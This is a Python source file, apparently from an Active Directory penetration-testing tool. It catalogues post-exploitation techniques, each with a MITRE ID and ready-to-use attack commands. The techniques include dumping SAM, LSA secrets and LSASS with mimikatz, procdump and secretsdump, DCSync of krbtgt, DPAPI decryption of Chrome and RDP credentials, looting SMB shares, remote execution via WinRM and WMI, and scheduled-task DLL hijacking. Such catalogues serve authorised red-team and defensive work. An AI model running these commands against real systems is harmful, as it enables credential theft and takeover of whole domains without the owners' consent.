from __future__ import annotations

from dataclasses import dataclass


@dataclass(frozen=True)
class PostexTechnique:
    key: str
    title: str
    severity: str
    mitre_id: str
    summary: str
    manual_commands: tuple[str, ...]
    guide_key: str = "postex_local"
    requires_external_listener: bool = False



POSTEX_TECHNIQUES: dict[str, PostexTechnique] = {
    "adminto": PostexTechnique(
        key="adminto",
        title="AdminTo — remote admin access",
        severity="high",
        mitre_id="T1021",
        summary="Use compromised creds for SMB/WinRM/RDP to admin-accessible hosts.",
        manual_commands=(
            "nxc smb <host> -u user -p pass -x whoami",
            "wmiexec.py <DOMAIN>/user:pass@<host>",
            "evil-winrm -i <host> -u user -p pass",
        ),
    ),
    "sam_dump": PostexTechnique(
        key="sam_dump",
        title="SAM dump (registry)",
        severity="high",
        mitre_id="T1003.002",
        summary="Extract local NTLM hashes from SAM hive (needs SYSTEM).",
        manual_commands=(
            "reg save HKLM\\SAM sam.hive",
            "reg save HKLM\\SYSTEM system.hive",
            "secretsdump.py -sam sam.hive -system system.hive LOCAL",
        ),
    ),
    "lsa_secrets": PostexTechnique(
        key="lsa_secrets",
        title="LSA Secrets",
        severity="high",
        mitre_id="T1003.004",
        summary="Dump LSA secrets (service account passwords, cached creds).",
        manual_commands=(
            "reg save HKLM\\SECURITY security.hive",
            "secretsdump.py -security security.hive -system system.hive LOCAL",
            "mimikatz # lsadump::secrets",
        ),
    ),
    "lsass_dump": PostexTechnique(
        key="lsass_dump",
        title="LSASS dump",
        severity="critical",
        mitre_id="T1003.001",
        summary="Dump LSASS for tickets, NTLM, Kerberos keys, DPAPI masterkeys.",
        manual_commands=(
            "procdump.exe -accepteula -ma lsass.exe lsass.dmp",
            "pypykatz lsa minidump lsass.dmp",
            "mimikatz # sekurlsa::logonpasswords",
        ),
    ),
    "dcsync": PostexTechnique(
        key="dcsync",
        title="DCSync",
        severity="critical",
        mitre_id="T1003.006",
        summary="Replicate domain password hashes via DRSUAPI.",
        manual_commands=(
            "secretsdump.py <DOMAIN>/user:pass@<DC> -just-dc",
            "mimikatz # lsadump::dcsync /domain:<DOMAIN> /user:krbtgt",
        ),
    ),
    "dpapi": PostexTechnique(
        key="dpapi",
        title="DPAPI secrets",
        severity="medium",
        mitre_id="T1555",
        summary="Decrypt Chrome, RDP, scheduled task creds with DPAPI masterkeys.",
        manual_commands=(
            "dpapi.py masterkeys -file lsass.dmp",
            "dpapi.py chrome -file Cookies -key <masterkey>",
        ),
    ),
    "share_loot": PostexTechnique(
        key="share_loot",
        title="Share credential loot",
        severity="medium",
        mitre_id="T1552.001",
        summary="Search SMB shares for passwords, configs, scripts, backups.",
        manual_commands=(
            "nxc smb <DC> -u user -p pass --spider SYSVOL",
            "snaffler / TruffleHog on mounted shares",
        ),
    ),
    "rdp_creds": PostexTechnique(
        key="rdp_creds",
        title="RDP saved credentials",
        severity="medium",
        mitre_id="T1555.004",
        summary="Extract saved RDP credentials from Credential Manager / vault.",
        manual_commands=(
            "cmdkey /list",
            "mimikatz # dpapi::cred /in:<blob>",
        ),
    ),
    "scheduled_task_com_enum": PostexTechnique(
        key="scheduled_task_com_enum",
        title="Scheduled tasks via COM (CIM blocked)",
        severity="info",
        mitre_id="T1053.005",
        summary=(
            "Enumerate scheduled tasks when Get-ScheduledTask and schtasks.exe are denied "
            "(uses Task Scheduler COM API)."
        ),
        manual_commands=(
            "admapper winrm -H <host> -d <domain> -u '<user>' --hash <NTLM> -x \"whoami\"",
            "$s=New-Object -ComObject Schedule.Service; $s.Connect()",
            "$s.GetFolder('\\').GetTasks(0) | ForEach-Object { $_.Name }",
            "$t=$s.GetFolder('\\').GetTask('<task>'); $t.Definition.Principal.UserId; $t.Definition.Actions",
        ),
    ),
    "dll_hijack_scheduled_task": PostexTechnique(
        key="dll_hijack_scheduled_task",
        title="Scheduled task DLL hijack",
        severity="critical",
        mitre_id="T1574.001",
        summary=(
            "Task '<task>' runs as <runas> and loads a DLL from a writable drop path "
            "(<zip> → <dll>)."
        ),
        manual_commands=(
            "admapper postex scan -w <workspace>",
            "admapper postex run --op <id> -w <workspace>",
        ),
    ),
}


def postex_meta(key: str) -> PostexTechnique:
    return POSTEX_TECHNIQUES.get(
        key,
        PostexTechnique(
            key=key,
            title=key.replace("_", " ").title(),
            severity="medium",
            mitre_id="T1003",
            summary=f"Post-exploitation technique: {key}",
            manual_commands=("guide postex_local",),
        ),
    )
